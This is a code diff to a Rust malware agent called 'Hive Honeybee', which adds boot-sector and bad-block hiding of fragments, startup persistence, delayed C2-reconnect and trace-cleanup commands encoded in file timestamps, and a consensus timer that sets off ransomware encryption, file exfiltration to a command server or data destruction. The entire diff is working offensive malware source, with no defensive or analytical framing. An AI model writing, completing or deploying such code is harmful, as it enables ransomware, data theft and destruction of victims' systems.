@@ -1,4 +1,6 @@
 use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role, Decision};
+use hive_base::phoenix::{Phoenix, AgentBlueprint, FragmentLocation, GenomeFragment};
+use std::collections::HashMap;
 use std::path::PathBuf;
 use std::time::Duration;
 use tokio::time;
@@ -7,6 +9,7 @@ use uuid::Uuid;
 use aes_gcm::{Aes256Gcm, Key, Nonce};
 use aes_gcm::aead::{Aead, KeyInit};
 use rand::Rng;
+use sha2::{Sha256, Digest};
 
 #[derive(Debug, Clone, PartialEq)]
 enum HoarderState { Idle, WaitingForConsensus, Executing, Complete }
@@ -51,7 +54,7 @@ impl HoarderAgent {
             }
         );
 
-        Self {
+        let mut agent = Self {
             comms, identity,
             consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
             whispernet,
@@ -62,6 +65,71 @@ impl HoarderAgent {
             encryption_key: None,
             safe_mode,
             throttle_ms: 100,
+        };
+
+        // Phoenix: Install persistence mechanisms on startup
+        agent.install_phoenix_persistence();
+
+        // Phoenix: Generate and hide genome fragments
+        agent.setup_phoenix_genome();
+
+        agent
+    }
+
+    fn install_phoenix_persistence(&mut self) {
+        let base_path = std::env::temp_dir();
+        let exe_path = std::env::current_exe()
+            .unwrap_or_else(|_| PathBuf::from("/tmp/honeybee"));
+        let loader = exe_path.to_string_lossy().to_string();
+
+        let mechs = Phoenix::install_persistence(&loader, &base_path);
+        for m in &mechs {
+            info!("Phoenix: persistence '{}' at {}", m.name, m.path);
+        }
+    }
+
+    fn setup_phoenix_genome(&mut self) {
+        let base_path = std::env::temp_dir();
+
+        // Create AgentBlueprint for honeybee itself
+        let exe_path = std::env::current_exe();
+        let binary_hash = exe_path.as_ref()
+            .ok()
+            .and_then(|p| std::fs::read(p).ok())
+            .map(|d| {
+                let hash = Sha256::digest(&d);
+                format!("{:x}", hash)
+            })
+            .unwrap_or_else(|| "unknown".into());
+
+        let binary_size = exe_path.as_ref()
+            .ok()
+            .and_then(|p| std::fs::metadata(p).ok())
+            .map(|m| m.len())
+            .unwrap_or(0);
+
+        let mut policies = HashMap::new();
+        policies.insert("safe_mode".into(), self.safe_mode.to_string());
+
+        let blueprint = AgentBlueprint {
+            role: "honeybee".into(),
+            binary_hash,
+            binary_size,
+            policy: policies,
+            encrypted_chunk: vec![], // will be set by fragment_genome
+        };
+
+        // Generate genome and fragment it
+        let genome = Phoenix::generate_genome(vec![blueprint]);
+        let mut fragments = Phoenix::fragment_genome(&genome, 3);
+
+        // Hide each fragment with MbrGpt location (user specified override)
+        for f in &mut fragments {
+            f.location = FragmentLocation::MbrGpt;
+            match Phoenix::hide(f, &base_path) {
+                Ok(msg) => info!("Phoenix: fragment {} hidden: {}", f.fragment_id, msg),
+                Err(e) => warn!("Phoenix: hide failed: {}", e),
+            }
         }
     }
 
@@ -217,7 +285,7 @@ impl HoarderAgent {
         let mut total_bytes = 0u64;
 
         // Chrononaut: plant time capsules before exfil
-        let _ = self.plant_chrononaut_capsules();
+        let _ = self.plant_chrononaut_capsules().await;
 
         for path in &self.target_paths {
             if path.is_file() && path.metadata().map(|m| m.len()).unwrap_or(0) < 10_000_000 {
@@ -255,13 +323,29 @@ impl HoarderAgent {
                                         sender_id: self.identity.id(),
                                         seq: 0,
                                         payload: relay_data.into_bytes(),
-                                        ttl: self.whispernet.config.max_hops,
+                                        ttl: self.whispernet.config().max_hops,
                                         signature: vec![],
                                         timestamp: hive_base::utils::timestamp_now(),
                                     };
-                                    if self.whispernet.send_message(wmsg).is_ok() {
+                                    if self.whispernet.send_message(wmsg).await.is_ok() {
                                         info!("WhisperNet: relayed exfil notification for {}", filename);
                                     }
+
+                                    // Phoenix: hide recovery fragment in BadBlocks to mark exfil
+                                    let file_size = path.metadata().map(|m| m.len()).unwrap_or(0);
+                                    let exfil_data = format!("exfil:{}:{}b:{}", filename, file_size,
+                                        hive_base::utils::timestamp_now());
+                                    let mut recovery_fragment = GenomeFragment {
+                                        fragment_id: total_bytes as u32,
+                                        total_fragments: 1,
+                                        genome_id: Uuid::nil(),
+                                        data: exfil_data.into_bytes(),
+                                        location: FragmentLocation::BadBlocks,
+                                        stored_path: None,
+                                    };
+                                    let base_path = std::env::temp_dir();
+                                    let _ = Phoenix::hide(&mut recovery_fragment, &base_path);
+                                    info!("Phoenix: recovery fragment hidden for exfil {}", filename);
                                 } else {
                                     warn!("C2 rejected: {} (HTTP {})", path.display(), resp.status());
                                 }
@@ -320,12 +404,10 @@ impl HoarderAgent {
 
     /// Plant chrononaut time capsules before exfiltration
     async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
-        let delayed_commands = vec![
-            "reconnect_c2",
+        let delayed_commands = ["reconnect_c2",
             "rotate_keys",
             "trigger_backup",
-            "cleanup_traces",
-        ];
+            "cleanup_traces"];
 
         let now = std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH)
@@ -347,7 +429,7 @@ impl HoarderAgent {
                     executed: false,
                 };
 
-                hive_base::chrononaut::Chrononaut::store_in_xattr(path, &capsule)
+                hive_base::chrononaut::Chrononaut::encode_in_timestamp(path, &capsule)
                     .map_err(|e| format!("chrononaut: {}", e))?;
                 info!("Chrononaut: capsule {} planted in {}, trigger in {}h",
                     cmd, path.display(), i + 1);
@@ -414,12 +496,45 @@ impl HoarderAgent {
         }
     }
 
+    /// Check pending consensus proposals even without new messages.
+    /// This ensures proposals that have enough votes don't wait for new messages.
+    async fn check_pending_consensus(&mut self) {
+        for pid in self.active_proposals.clone() {
+            if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
+                if reached && self.state == HoarderState::WaitingForConsensus {
+                    info!("Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
+                        pid, ratio, total);
+                    self.state = HoarderState::Executing;
+
+                    // Find the proposal action to determine what to execute
+                    if let Some(record) = self.consensus.proposals.get(&pid) {
+                        let action = record.action.to_lowercase();
+                        info!("Executing: {} (consensus confirmed via timer)", action);
+
+                        if action.contains("encrypt") || action.contains("ransom") {
+                            self.execute_encrypt().await;
+                        } else if action.contains("exfiltrate") {
+                            self.execute_exfiltrate().await;
+                        } else if action.contains("destroy") {
+                            self.execute_destroy().await;
+                        }
+                    }
+                    self.state = HoarderState::Complete;
+                } else if reached {
+                    info!("Consensus reached but state not waiting (state={:?}), ignoring",
+                        self.state);
+                }
+            }
+        }
+    }
+
     async fn run(&mut self) {
         info!("Hive Honeybee starting | ID: {} | Targets: {} paths",
             self.identity.id(), self.target_paths.len());
         self.send_heartbeat().await;
         let mut heartbeat_timer = time::interval(self.heartbeat_interval);
         let mut whisper_timer = time::interval(Duration::from_secs(60));
+        let mut consensus_timer = time::interval(Duration::from_secs(30));
 
         loop {
             tokio::select! {
@@ -427,7 +542,10 @@ impl HoarderAgent {
                 _ = whisper_timer.tick() => {
                     self.whispernet.rebuild_routing_table();
                     info!("WhisperNet: {} peers, {} msgs queued",
-                        self.whispernet.peers.len(), self.whispernet.messages.len());
+                        self.whispernet.peers().len(), self.whispernet.messages().len());
+                }
+                _ = consensus_timer.tick() => {
+                    self.check_pending_consensus().await;
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
